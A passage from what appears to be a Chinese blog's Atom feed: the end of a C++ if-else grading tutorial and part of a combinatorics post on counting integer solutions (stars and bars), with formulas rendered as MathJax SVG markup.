std::cout &lt;&lt; <span class="string">&quot;等级: A&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (score &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;等级: B&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (score &gt;= <span class="number">70</span>) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;等级: C&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (score &gt;= <span class="number">60</span>) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;等级: D&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;等级: F&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>在这个程序中，用户被提示输入一个分数，程序会根据输入的分数使用 <code>if-else if-else</code> 结构来确定并打印出相应的等级。</p><p>请注意，<code>if</code> 语句中的条件是一个布尔表达式，它必须返回一个真值（非零值）或假值（零值）。如果条件为真，则执行与 <code>if</code> 关联的代码块；如果为假，并且存在 <code>else</code> 子句，则执行与 <code>else</code> 关联的代码块。如果不存在 <code>else</code> 子句，则程序将继续执行 <code>if</code> 语句之后的代码。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="c/c++" scheme="http://example.com/categories/c-c/"/>
    
    
    <category term="cpp" scheme="http://example.com/tags/cpp/"/>
    
  </entry>
  
  <entry>
    <title>排列组合超级神奇的技巧</title>
    <link href="http://example.com/2023/04/29/%E6%95%B0%E5%AD%A6/%E6%8E%92%E5%88%97%E7%BB%84%E5%90%88%E8%B6%85%E7%BA%A7%E7%A5%9E%E5%A5%87%E7%9A%84%E6%8A%80%E5%B7%A7/"/>
    <id>http://example.com/2023/04/29/%E6%95%B0%E5%AD%A6/%E6%8E%92%E5%88%97%E7%BB%84%E5%90%88%E8%B6%85%E7%BA%A7%E7%A5%9E%E5%A5%87%E7%9A%84%E6%8A%80%E5%B7%A7/</id>
    <published>2023-04-29T19:50:53.000Z</published>
    <updated>2024-11-07T08:34:21.256Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="N个相同元素分为M堆，每堆至少x个，可以分为"><a href="#N个相同元素分为M堆，每堆至少x个，可以分为" class="headerlink" title="N个相同元素分为M堆，每堆至少x个，可以分为"></a><em>N个相同元素分为M堆，每堆至少x个，可以分为</em></h1><p><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -1.204ex;" xmlns="http://www.w3.org/2000/svg" width="14.623ex" height="3.231ex" role="img" focusable="false" viewBox="0 -896 6463.3 1428"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msubsup"><g data-mml-node="mi"><path data-c="1D436" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z"></path></g><g data-mml-node="TeXAtom" transform="translate(845.3,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D440" d="M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z"></path></g><g data-mml-node="mo" transform="translate(1051,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(1829,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="TeXAtom" transform="translate(748,-355.3) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(389,0)"><path data-c="1D441" d="M234 637Q231 637 226 637Q201 637 196 638T191 649Q191 676 202 682Q204 683 299 683Q376 683 387 683T401 677Q612 181 616 168L670 381Q723 592 723 606Q723 633 659 637Q635 637 635 648Q635 650 637 660Q641 676 643 679T653 683Q656 683 684 682T767 680Q817 680 843 681T873 682Q888 682 888 672Q888 650 880 642Q878 637 858 637Q787 633 769 597L620 7Q618 0 599 0Q585 0 582 2Q579 5 453 305L326 604L261 344Q196 88 196 79Q201 46 268 46H278Q284 41 284 38T282 19Q278 6 272 0H259Q228 2 151 2Q123 2 100 2T63 2T46 1Q31 1 31 10Q31 14 34 26T39 40Q41 46 62 46Q130 49 150 85Q154 91 221 362L289 634Q287 635 234 637Z"></path></g><g data-mml-node="mo" transform="translate(1277,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(2055,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mi" transform="translate(2555,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">）</text></g><g data-mml-node="mo" transform="translate(3555,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mi" transform="translate(4333,0)"><path data-c="1D440" d="M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z"></path></g><g data-mml-node="mo" transform="translate(5384,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(5773,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(6273,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mi" transform="translate(7051,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(7623,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></g></g></svg></mjx-container><br>例：</p><ul><li><p><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="19.66ex" height="1.756ex" role="img" focusable="false" viewBox="0 -694 8689.9 776"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" transform="translate(500,0)"></path></g><g data-mml-node="mi" transform="translate(778,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(1529.2,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mi" transform="translate(2529.4,0)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g><g data-mml-node="mo" transform="translate(3180.7,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mi" transform="translate(4180.9,0)"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path></g><g data-mml-node="mo" transform="translate(4836.1,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mi" transform="translate(5836.3,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mo" transform="translate(6634.1,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(7689.9,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(500,0)"></path></g></g></g></svg></mjx-container>该方程的正整数解有多少种？非负整数解又有多少种？<br>我们可以理解为有10个相同的1<br>1 1 1 1 1 1 1 1 1 1 将其分为4组，有多少种方法？<mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.609ex;" xmlns="http://www.w3.org/2000/svg" width="2.825ex" height="2.607ex" role="img" focusable="false" viewBox="0 -883.2 1248.8 1152.3"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msubsup"><g data-mml-node="mi"><path data-c="1D436" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z"></path></g><g data-mml-node="TeXAtom" transform="translate(845.3,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g></g><g data-mml-node="TeXAtom" transform="translate(748,-253.5) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="39" d="M352 287Q304 211 232 211Q154 211 104 270T44 396Q42 412 42 436V444Q42 537 111 606Q171 666 243 666Q245 666 249 666T257 665H261Q273 665 286 663T323 651T370 619T413 560Q456 472 456 334Q456 194 396 97Q361 41 312 10T208 -22Q147 -22 108 7T68 93T121 149Q143 149 158 135T173 96Q173 78 164 65T148 49T135 44L131 43Q131 41 138 37T164 27T206 22H212Q272 22 313 86Q352 142 352 280V287ZM244 248Q292 248 321 297T351 430Q351 508 343 542Q341 552 337 562T323 588T293 615T246 625Q208 625 181 598Q160 576 154 546T147 441Q147 358 152 329T172 282Q197 248 244 248Z"></path></g></g></g></g></g></svg></mjx-container></p></li><li><p>2.将10本相同的书分给4个班级，要求每个班级至少两本书，共有多少种排列方法？<br>原题可等价为<mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.452ex;" xmlns="http://www.w3.org/2000/svg" width="32.671ex" height="2.149ex" role="img" focusable="false" viewBox="0 -750 14440.7 950"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="TeXAtom" transform="translate(605,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g><g data-mml-node="mo" transform="translate(1230.8,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msub" transform="translate(2231,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="TeXAtom" transform="translate(605,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g></g><g data-mml-node="mo" transform="translate(3461.8,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msub" transform="translate(4462,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="TeXAtom" transform="translate(605,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g></g></g><g data-mml-node="mo" transform="translate(5692.8,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msub" transform="translate(6693,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="TeXAtom" transform="translate(605,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g></g></g><g data-mml-node="mo" transform="translate(7979.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(9035.1,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(500,0)"></path></g><g data-mml-node="mi" transform="translate(10035.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">（</text></g><g data-mml-node="mi" transform="translate(11035.1,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(11884.9,0)"><path data-c="2265" d="M83 616Q83 624 89 630T99 636Q107 636 253 568T543 431T687 361Q694 356 694 346T687 331Q685 329 395 192L107 56H101Q83 58 83 76Q83 77 83 79Q82 86 98 95Q117 105 248 167Q326 204 378 228L626 346L360 472Q291 505 200 548Q112 589 98 597T83 616ZM84 -118Q84 -108 99 -98H678Q694 -104 694 -118Q694 -130 679 -138H98Q84 -131 84 -118Z"></path></g><g data-mml-node="mn" transform="translate(12940.7,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 